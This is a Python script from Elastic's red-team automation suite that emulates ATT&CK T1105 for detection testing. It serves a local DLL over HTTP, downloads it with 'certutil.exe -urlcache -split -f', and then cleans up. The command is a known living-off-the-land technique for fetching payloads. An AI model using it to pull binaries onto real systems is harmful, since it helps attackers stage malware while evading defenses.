# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: Downloading Files With Certutil
# RTA: certutil_webrequest.py
# ATT&CK: T1105
# Description: Uses certutil.exe to download a file.

from . import common

MY_DLL = common.get_path("bin", "mydll.dll")


@common.requires_os(common.WINDOWS)
@common.dependencies(MY_DLL)
def main():
    # http server will terminate on main thread exit
    # if daemon is True
    server, ip, port = common.serve_web()

    uri = "bin/mydll.dll"
    target_file = "mydll.dll"
    common.clear_web_cache()
    url = "http://{ip}:{port}/{uri}".format(ip=ip, port=port, uri=uri)
    common.execute(["certutil.exe", "-urlcache", "-split", "-f", url, target_file])

    server.shutdown()
    common.remove_file(target_file)


if __name__ == "__main__":
    exit(main())
